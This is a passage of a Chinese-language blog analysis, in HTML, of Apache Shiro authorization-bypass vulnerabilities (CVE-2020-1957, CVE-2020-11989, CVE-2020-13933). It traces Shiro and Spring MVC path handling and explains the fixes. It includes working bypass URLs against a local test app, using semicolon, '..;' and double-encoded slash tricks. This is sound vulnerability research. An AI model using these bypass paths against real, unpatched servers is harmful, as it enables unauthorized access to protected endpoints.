class="keyword">if</span> (!normalized.startsWith(<span class="string">&quot;/&quot;</span>))</span><br><span class="line">            normalized = <span class="string">&quot;/&quot;</span> + normalized;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Resolve occurrences of &quot;//&quot; in the normalized path</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">            <span class="keyword">int</span> index = normalized.indexOf(<span class="string">&quot;//&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (index &lt; <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            normalized = normalized.substring(<span class="number">0</span>, index) +</span><br><span class="line">                    normalized.substring(index + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Resolve occurrences of &quot;/./&quot; in the normalized path</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">            <span class="keyword">int</span> index = normalized.indexOf(<span class="string">&quot;/./&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (index &lt; <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            normalized = normalized.substring(<span class="number">0</span>, index) +</span><br><span class="line">                    normalized.substring(index + <span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Resolve occurrences of &quot;/../&quot; in the normalized path</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">            <span class="keyword">int</span> index = normalized.indexOf(<span class="string">&quot;/../&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (index &lt; <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">if</span> (index == <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">return</span> (<span class="keyword">null</span>);  <span class="comment">// Trying to go outside our context</span></span><br><span class="line">            <span class="keyword">int</span> index2 = normalized.lastIndexOf(<span class="string">&#x27;/&#x27;</span>, index - <span class="number">1</span>);</span><br><span class="line">            normalized = normalized.substring(<span class="number">0</span>, index2) +</span><br><span class="line">                    normalized.substring(index + <span class="number">3</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Return the normalized path that we have completed</span></span><br><span class="line">        <span class="keyword">return</span> (normalized);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>由于此时传入的为经过decodeAndCleanUriString处理后的值（/aa/..），所以这里经过normalize处理后结果不变：</p>
+<p><img src="/2021/09/08/Shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1630810879658-6b556d3b-a3b0-4d1c-8b65-465ef7cede1b.png" alt="img"></p>
+<p>也就是说此时通过WebUtils.getRequestUri获取到的requestUri的值为/aa/..</p>
+<p><img src="/2021/09/08/Shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1630810949737-cb56d03b-6473-493d-a5f2-b88f0ad64bd2.png" alt="img"></p>
+<p>且getPathWithinApplication后的值也为/aa/..</p>
+<p><img src="/2021/09/08/Shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1630811094176-66d3450e-57ff-4e4d-aee4-c2415e56c08c.png" alt="img"></p>
+<p>接下来将对requestURI和在shiro配置文件中配置的过滤规则filterChains进行匹配，则/aa/..不会和任何规则匹配成功，返回null：</p>
+<p><img src="/2021/09/08/Shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1630811284815-537bd7e2-85b4-4377-9221-f42c5b2ca665.png" alt="img"></p>
+<p>至此，我们通过在请求url中添加 ; 成功绕过了shiro的filter过滤匹配，并成功进入SpringMVC controller解析过程，其中入口为SpringMVC的DispatcherServlet.doService()：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">org.apache.catalina.core.ApplicationFilterChain#internalDoFilter --&gt;  javax.servlet.Servlet#service --&gt; javax.servlet.http.HttpServlet#service --&gt; javax.servlet.http.HttpServlet#doGet --&gt; org.springframework.web.servlet.FrameworkServlet#processRequest --&gt; </span><br><span class="line">org.springframework.web.servlet.DispatcherServlet#doService  --&gt;  </span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/09/08/Shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1630811428049-15663115-be70-4f2d-ba24-666150d9c746.png" alt="img"></p>
+<p><img src="/2021/09/08/Shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1630811448669-b4aeb01a-827c-4092-a470-1d3bc08fa14b.png" alt="img"></p>
+<p><img src="/2021/09/08/Shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1630811624029-06a2480f-8ff0-4c6f-96b6-2f5904c8288f.png" alt="img"></p>
+<p><img src="/2021/09/08/Shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1630811689283-2290f02b-09c1-4985-b2c1-51cdb50ed836.png" alt="img"></p>
+<p><img src="/2021/09/08/Shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1630811708232-9b04ba5d-e375-44de-8c35-43251c2934a2.png" alt="img"></p>
+<p>在DispatcherServlet.doService中将调用核心的doDispatch方法进行下一步处理：</p>
+<p><img src="/2021/09/08/Shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1630812974042-0739a060-658e-457a-bc3e-0f0602260706.png" alt="img"></p>
+<p>其中doDispatch主要处理逻辑如下：</p>
+<ol>
+<li><p>checkMultipart 检查是不是文件上传请求，如果是，则对当前 request 重新进行包装，如果不是，则直接将参数返回；</p>
+</li>
+<li><p>根据当前请求，调用 getHandler 方法获取请求处理器，如果没找到对应的请求处理器，则调用 noHandlerFound 方法抛出异常或者给出 404；</p>
+</li>
+<li><p>getHandlerAdapter 方法，根据当前的处理器找到处理器适配器；</p>
+</li>
+<li><p>然后处理 GET 和 HEAD 请求头的 Last_Modified 字段。当浏览器第一次发起 GET 或者 HEAD 请求时，请求的响应头中包含一个 Last-Modified 字段，这个字段表示该资源最后一次修改时间，以后浏览器再次发送 GET、HEAD 请求时，都会携带上该字段，服务端收到该字段之后，和资源的最后一次修改时间进行对比，如果资源还没有过期，则直接返回 304 告诉浏览器之前的资源还是可以继续用的，如果资源已经过期，则服务端会返回新的资源以及新的 Last-Modified；</p>
+</li>
+<li><p>接下来调用拦截器的 preHandle 方法，如果该方法返回 false，则直接 return 掉当前请求；</p>
+</li>
+<li><p>接下来执行 ha.handle 去调用真正的请求，获取到返回结果 mv；</p>
+</li>
+<li><p>接下来判断当前请求是否需要异步处理，如果需要，则直接 return 掉；如果不需要异步处理，则执行 applyDefaultViewName 方法，检查当前 mv 是否没有视图，如果没有（例如方法返回值为 void），则给一个默认的视图名；</p>
+</li>
+<li><p>processDispatchResult 方法对执行结果进行处理，包括异常处理、渲染页面以及执行拦截器的 afterCompletion 方法都在这里完成；</p>
+</li>
+<li><p>最后在 finally 代码块中判断是否开启了异步处理，如果开启了，则调用相应的拦截器；如果请求是文件上传请求，则再调用 cleanupMultipart 方法清除文件上传过程产生的一些临时文件。</p>
+</li>
+</ol>
+<p>其中我们关心的是获取请求处理器的过程，即getHandler方法实现细节：</p>
+<p>首先Spring会循环所有注册的HandlerMapping并返回第一个匹配的HandlerExecutionChain：</p>
+<p><img src="/2021/09/08/Shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1630814032639-f5384d69-548c-4915-885c-31f826e6f859.png" alt="img"></p>
+<p>对于mapping为RequestMappingHandlerMapping时，则会调用org.springframework.web.servlet.handler.AbstractHandlerMapping#getHandler进行获取对应的handler，</p>
+<p>在getHandler中调用getHandlerInternal方法，并在其中进行调用getLookupPathForRequest–&gt;getPathWithinServletMapping解析请求路径lookupPath：</p>
+<p><img src="/2021/09/08/Shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1630814270890-44405c4d-f4b9-47aa-b06b-b1d3ec5bbbd1.png" alt="img"></p>
+<p>对于getPathWithinServletMapping中首先通过getPathWithinApplication获取请求URI在web应用中的路径，其中经过如下调用链：</p>
+<p><img src="/2021/09/08/Shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1630816294063-b78527a9-edf2-4d0e-8c9e-eee4f42fdbdd.png" alt="img"></p>
+<p>最终在org.springframework.web.util.UrlPathHelper#getRequestUri中通过request.getRequestURI()获取请求的uri，即/aa/..;test=123/admin/index，并通过decodeAndCleanUriString方法对uri进行处理：</p>
+<p><img src="/2021/09/08/Shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1630814552407-1b27fd57-a556-4d2d-9c66-c5e91c488858.png" alt="img"></p>
+<p><img src="/2021/09/08/Shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1630814571335-e2e07b55-4482-4841-926d-13d5065b460e.png" alt="img"></p>
+<p>decodeAndCleanUriString方法中主要做了三件事：</p>
+<ol>
+<li>调用removeSemicolonContent方法对uri进行处理，其中将分号及后面的key-value进行了去除得到新的requestUri为/aa/../admin/index：</li>
+</ol>
+<p><img src="/2021/09/08/Shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1630814649876-ba27a14c-84b0-4bdd-8e20-17008abd1635.png" alt="img"></p>
+<ol>
+<li>通过调用decodeRequestString进行URL解码：</li>
+</ol>
+<p><img src="/2021/09/08/Shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1630815007728-c38c58ba-f7c3-4841-956b-e5028e47109c.png" alt="img"></p>
+<ol>
+<li>通过调用getSanitizedPath将//替换为/：</li>
+</ol>
+<p><img src="/2021/09/08/Shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1630815019684-7b0f5c02-5b48-484d-8ed5-1bb2eb6ed332.png" alt="img"></p>
+<p>至此经过decodeAndCleanUriString方法处理后最终获取到的uri为/aa/../admin/index，即getPathWithinApplication返回的结果pathWithinApp的值也为/aa/../admin/index：</p>
+<p><img src="/2021/09/08/Shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1630815090450-f094f3f2-a50c-4d2f-88e7-45654e8d571c.png" alt="img"></p>
+<p><img src="/2021/09/08/Shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1630816436686-6e9f82b5-e84e-4652-a15e-468f6e2d8d94.png" alt="img"></p>
+<p>接下来回到getPathWithinServletMapping中，此时pathWithinApp值为/aa/../admin/index，servletPath为/admin/index，正常情况下将通过getRemainingPath方法将pathWithinApp中servletPath给截取掉，但此时由于两者值无法截取成功返回为null：</p>
+<p><img src="/2021/09/08/Shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1630827548330-2d757707-5a2e-4869-9664-78844963a702.png" alt="img"></p>
+<p><img src="/2021/09/08/Shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1630827589372-af31f5c6-ce38-47f5-be95-1a557000ade1.png" alt="img"></p>
+<p>由于path为null，则进入else这种特殊情况，最终返回servletPath，即/admin/index：</p>
+<p><img src="/2021/09/08/Shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1630827738887-b16a24c8-efaf-47c9-aff1-d81d040f440c.png" alt="img"></p>
+<p>即最终获取到的lookupPath值为/admin/index，并根据lookupPath的值寻找相对应的handlerMethod为com.ttestoo.bypass.controller.LoginController#admin_index()：</p>
+<p><img src="/2021/09/08/Shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1630827874273-60cc455e-5d29-4744-b8e5-7a7c5f04b4a4.png" alt="img"></p>
+<p>至此，SpringMVC中获取handler的过程已结束，成功获取到/admin/index相对应的handler方法，并将继续获取HandlerAdapter，并执行HandlerAdapter的handle方法利用反射机制执行/admin/index相对应的controller方法com.ttestoo.bypass.controller.LoginController#admin_index()：</p>
+<p><img src="/2021/09/08/Shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1630828216926-97b8f1d8-a233-4852-85ec-6100b1695544.png" alt="img"></p>
+<p><img src="/2021/09/08/Shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1630828309858-4c7c4de8-c44b-4281-8f82-ff557a9eb5b3.png" alt="img"></p>
+<p><strong>总结：</strong></p>
+<p>当我们发起请求<a target="_blank" rel="noopener" href="http://127.0.0.1:9091/aa/..;test=123/admin/index%E6%97%B6%EF%BC%8C%E7%BB%8F%E8%BF%87shiro">http://127.0.0.1:9091/aa/..;test=123/admin/index时，经过shiro</a> filter进行权限校验，此时shiro解析到的路径为/aa/..不会和任何规则匹配成功，从而通过了shiro的权限校验；</p>
+<p>接下来会由springmvc进行controller解析，此时springmvc解析到的路径为/admin/index，并获取到/admin/index对应的handler方法admin_index，从而正常的执行service并得到最终的响应。</p>
+<p><strong>漏洞本质：</strong></p>
+<p>当路径中包含特殊字符时，shiro解析得到的路径和SpringMVC解析得到的路径不一致，导致可正常通过shiro的权限校验并正常的完成service的执行获取执行结果。</p>
+<h2 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h2><p>在实际场景中每个API会通过网关层统一校验或@RequiresPermissions注解等方式校验所需访问权限，此漏洞仅能绕过shiro全局的Filter校验，无法绕过API配置的访问权限；</p>
+<p>个人理解此问题在实战中利用场景相对有限。</p>
+<h2 id="修复方式"><a href="#修复方式" class="headerlink" title="修复方式"></a>修复方式</h2><p>根据官方commit记录，可知在1.5.2开始，在org.apache.shiro.web.util.WebUtils#getRequestUri中获取uri的方式从request.getRequestURI()换成了request.getContextPath()+request.getServletPath()+request.getPathInfo()组合的方式：</p>
+<p><img src="/2021/09/08/Shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1630831911543-0b43ee1e-c97e-4382-9741-fc73e15343c1.png" alt="img"></p>
+<p>此时请求<a target="_blank" rel="noopener" href="http://127.0.0.1:9091/aa/..;test=123/admin/index%E8%8E%B7%E5%8F%96%E5%88%B0%E7%9A%84url%E4%B8%BA/admin/index%EF%BC%8C%E6%97%A0%E6%B3%95%E7%BB%95%E8%BF%87shiro%E7%9A%84%E6%9D%83%E9%99%90%E6%A0%A1%E9%AA%8C%EF%BC%9A">http://127.0.0.1:9091/aa/..;test=123/admin/index获取到的url为/admin/index，无法绕过shiro的权限校验：</a></p>
+<p><img src="/2021/09/08/Shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1630832201301-def312c4-e2c9-440b-9470-f653d11e9696.png" alt="img"></p>
+<h1 id="shiro权限绕过-CVE-2020-11989"><a href="#shiro权限绕过-CVE-2020-11989" class="headerlink" title="shiro权限绕过 CVE-2020-11989"></a>shiro权限绕过 CVE-2020-11989</h1><h2 id="利用条件-1"><a href="#利用条件-1" class="headerlink" title="利用条件"></a>利用条件</h2><p>主要是针对CVE-2020-1957修复后的绕过探索，主要两种方式：</p>
+<ul>
+<li>URL双编码：Apache Shiro = 1.5.2  &amp;  controller需为类似”/hello/{page}”的方式</li>
+<li>分号绕过：Apache Shiro &lt; 1.5.3    &amp;  server.servlet.context-path不为根/</li>
+</ul>
+<h2 id="利用过程-1"><a href="#利用过程-1" class="headerlink" title="利用过程"></a>利用过程</h2><h3 id="URL双编码"><a href="#URL双编码" class="headerlink" title="URL双编码"></a>URL双编码</h3><p>shiro版本需为1.5.2，访问<a target="_blank" rel="noopener" href="http://127.0.0.1:9091/hello/test%EF%BC%8C%E8%A2%ABshiro%E6%9D%83%E9%99%90%E6%A0%A1%E9%AA%8C%E6%8B%A6%E6%88%AA%EF%BC%9A">http://127.0.0.1:9091/hello/test，被shiro权限校验拦截：</a></p>
+<p><img src="/2021/09/08/Shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1630940489631-023496e1-da98-4daa-86b7-4e2d53939ba7.png" alt="img"></p>
+<p>访问<a target="_blank" rel="noopener" href="http://127.0.0.1:9091/hello/te%2fst">http://127.0.0.1:9091/hello/te%25%32%66st</a>可直接绕过权限校验：</p>
+<p><img src="/2021/09/08/Shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1630940471598-992e754e-ad27-42b5-ae86-7b79efaf47d6.png" alt="img"></p>
+<h3 id="分号绕过"><a href="#分号绕过" class="headerlink" title="分号绕过"></a>分号绕过</h3><p>需要配置server.servlet.context-path：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">server.servlet.context-path=/test</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1:9091/test/hello/test">http://127.0.0.1:9091/test/hello/test</a></p>
+<p><img src="/2021/09/08/Shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1630943081582-4a5406f7-7533-4e7a-a414-f4314b535385.png" alt="img"></p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1:9091/a/..;a=1/test/hello/test">http://127.0.0.1:9091/a/..;a=1/test/hello/test</a></p>
+<p><img src="/2021/09/08/Shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1630943069710-d91ad7b5-98ce-4864-8e06-81a410b061ed.png" alt="img"></p>
+<h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="URL双编码分析"><a href="#URL双编码分析" class="headerlink" title="URL双编码分析"></a>URL双编码分析</h3><p>首先发起http请求时，若url中存在URL编码字符，则会被容器进行一次URL解码，此时/hello/te%25%32%66st –&gt; /hello/te%2fst，接下来则同CVE-2020-1957过程一样，在shiro处理过程中会在org.apache.shiro.web.util.WebUtils#getPathWithinApplication中通过<em>getRequestUri</em>函数获取uri：</p>
+<p><img src="/2021/09/08/Shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1630940944021-d49d2cef-30eb-4cb0-a7a4-dc0603c17fd8.png" alt="img"></p>
+<p>在org.apache.shiro.web.util.WebUtils#getRequestUri中首先通过request.getContextPath()+request.getServletPath()+request.getPathInfo()组合的方式获取uri为：//hello/te%2fst</p>
+<p><img src="/2021/09/08/Shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1630941027724-973768dc-9e6a-46b0-b481-808a3b53f17f.png" alt="img"></p>
+<p>接着在进入normalize函数进行格式化处理时，传入的参数经过了<em>decodeAndCleanUriString</em>方法的处理，其中通过调用org.apache.shiro.web.util.WebUtils#decodeRequestString方法，利用URLDecoder.<em>decode</em>进行了URL解码为：//hello/te/st</p>
+<p><img src="/2021/09/08/Shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1630941223066-8d5d3e15-7452-49a0-b799-145565974c95.png" alt="img"></p>
+<p><img src="/2021/09/08/Shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1630941153275-fc2938c5-1511-4b06-97c1-350a73103326.png" alt="img"></p>
+<p>继续进入normalize函数，将//替换为/，最终获取到的uri为：/hello/te/st</p>
+<p><img src="/2021/09/08/Shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1630941324744-5c33ef7a-a9ab-4eaf-848d-eb3724832e01.png" alt="img"></p>
+<p>接下来就同上面shiro过程一致了，/hello/te/st不会和任何的规则匹配，成功解析controller并执行相对应的service获取响应结果：</p>
+<p><img src="/2021/09/08/Shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1630942588039-62813c12-4dce-4a19-9375-c57a7f035d18.png" alt="img"></p>
+<p>补充，在1.5.1及之前版本中，获取uri采用request.getRequestURI方式，获取到的为URL双编码的值，shiro进行一次解码并格式化处理后为/hello/te%2fst，则会和/hello/*进行匹配：</p>
+<p><img src="/2021/09/08/Shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1630942848484-fa4eaa47-4186-4d97-978e-318228a8fc9f.png" alt="img"></p>
+<h3 id="分号绕过分析"><a href="#分号绕过分析" class="headerlink" title="分号绕过分析"></a>分号绕过分析</h3><p>当请求为<a target="_blank" rel="noopener" href="http://127.0.0.1:9091/a/..;a=1/test/hello/test%E6%97%B6%EF%BC%8C">http://127.0.0.1:9091/a/..;a=1/test/hello/test时，</a></p>
+<p>同URL双编码主要区别在经过request.getContextPath()+request.getServletPath()+request.getPathInfo()组合获取到的uri为：/a/..;a=1/test//hello/test</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">request.getContextPath() --&gt; /a/..;a=<span class="number">1</span>/test</span><br><span class="line">request.getServletPath() --&gt; /hello/test</span><br><span class="line">request.getPathInfo() --&gt; <span class="keyword">null</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/09/08/Shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1630943377680-412a48a6-4637-4769-9ff8-1c92799cd8b1.png" alt="img"></p>
+<p>接着经过org.apache.shiro.web.util.WebUtils#decodeAndCleanUriString处理后，会根据 ; 进行分割，最终uri结果为：/a/..</p>
+<p><img src="/2021/09/08/Shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1630943877599-043d68cf-fa55-41d7-ad5a-513391047a04.png" alt="img"></p>
+<p>从而绕过shiro的权限校验，而接下来则和cve-2020-1957流程一致，springmvc会将 ; 进行剔除，最终根据/a/../test/hello/test，即/test/hello/test成功解析controller并执行service获取响应结果：</p>
+<p><img src="/2021/09/08/Shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1630944025834-d16b0083-2bdc-4ae8-bb0d-fa72de871d7b.png" alt="img"></p>
+<h2 id="修复方式-1"><a href="#修复方式-1" class="headerlink" title="修复方式"></a>修复方式</h2><p>在1.5.3中，获取uri方式改成了<em>getServletPath</em>(request) + <em>getPathInfo</em>(request)组合的方式，且去除了解码过程：</p>
+<p><img src="/2021/09/08/Shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1630945224378-2d1e0b77-3a46-45b0-9be4-e1de4c7dd9f2.png" alt="img"></p>
+<p>此时，同样的请求<a target="_blank" rel="noopener" href="http://127.0.0.1:9091/a/..;a=1/test/hello/test%EF%BC%8C%E8%8E%B7%E5%8F%96%E5%88%B0%E7%9A%84requestURI%E4%B8%BA%EF%BC%9A/hello/test">http://127.0.0.1:9091/a/..;a=1/test/hello/test，获取到的requestURI为：/hello/test</a></p>
+<p>请求<a target="_blank" rel="noopener" href="http://127.0.0.1:9091/hello/te%2fst">http://127.0.0.1:9091/hello/te%25%32%66st</a>获取到的requestURI为：/hello/te%27st</p>
+<p><img src="/2021/09/08/Shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1630945471480-9b2c69b6-7236-45b2-af8b-bb738eca964e.png" alt="img"></p>
+<h1 id="shiro权限绕过-CVE-2020-13933"><a href="#shiro权限绕过-CVE-2020-13933" class="headerlink" title="shiro权限绕过 CVE-2020-13933"></a>shiro权限绕过 CVE-2020-13933</h1><h2 id="利用条件-2"><a href="#利用条件-2" class="headerlink" title="利用条件"></a>利用条件</h2><p>Apache shiro&lt;=1.5.3 即 Apache Shiro &lt; 1.6.0</p>
+<p>controller需为类似”/hello/{page}”的方式</p>
+<h2 id="利用过程-2"><a href="#利用过程-2" class="headerlink" title="利用过程"></a>利用过程</h2><p><a target="_blank" rel="noopener" href="http://127.0.0.1:9091/hello/test">http://127.0.0.1:9091/hello/test</a></p>
+<p><img src="/2021/09/08/Shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1630945918658-bc68c88c-1bbd-4399-a165-0c2308f7f888.png" alt="img"></p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1:9091/hello/%3btest">http://127.0.0.1:9091/hello/%3btest</a></p>
+<p><img src="/2021/09/08/Shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1630945886978-5a1d43ef-4ad2-4fbd-b8a7-8a80a0dc96d5.png" alt="img"></p>
+<h2 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>当发起请求<a target="_blank" rel="noopener" href="http://127.0.0.1:9091/hello/%3btest%E6%97%B6%EF%BC%8C">http://127.0.0.1:9091/hello/%3btest时，</a></p>
+<p>首先容器会进行URL解码，/hello/%3btest –&gt; /hello/;test</p>
+<p>进入shiro处理，org.apache.shiro.web.util.WebUtils#getPathWithinApplication中最终结果即requestURI为/hello/：</p>
+<p><img src="/2021/09/08/Shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1630946332455-87612f5b-4980-4311-8cef-d7341c417640.png" alt="img"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">getServletPath(request) --&gt; /hello/;<span class="function">test</span></span><br><span class="line"><span class="function"><span class="title">getPathInfo</span><span class="params">(request)</span> --&gt; &quot;&quot;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">removeSemicolon中根据</span>;进行分割</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/09/08/Shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1630946573355-ad67852b-6b2a-45e3-a820-9b9f9d91f063.png" alt="img"></p>
+<p>而/hello/不会和/hello/*匹配，顺利进入controller解析并执行service获取响应结果：</p>
+<p><img src="/2021/09/08/Shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1630945886978-5a1d43ef-4ad2-4fbd-b8a7-8a80a0dc96d5.png" alt="img"></p>
+<h2 id="修复方式-2"><a href="#修复方式-2" class="headerlink" title="修复方式"></a>修复方式</h2><p>在1.6.0中，执行shiro过滤器时增加了preHandle方法进行判断是否继续执行：</p>
+<p><img src="/2021/09/08/Shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1631015122689-9c983628-67d6-429a-967e-99b8241626ff.png" alt="img"></p>
+<p>判断内容主要为：若请求URI中包含分号、反斜杠、非ASCII字符（均可配置），则直接响应400</p>
+<p><img src="/2021/09/08/Shiro%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/1631016774926-e0e9794a-c036-4504-864c-0724ca37a648.png" alt="img"></p>
